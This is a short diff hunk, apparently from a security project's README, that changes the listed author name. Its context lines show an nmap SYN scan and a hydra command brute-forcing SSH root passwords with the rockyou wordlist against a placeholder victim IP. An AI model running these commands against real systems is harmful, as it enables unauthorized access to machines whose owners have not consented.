@@ -22,4 +22,5 @@ nmap -sS <victim-ip>
 hydra -l root -P rockyou.txt ssh://<victim-ip>
 
 ## Author
-Anya Modi
+rashi jain
+
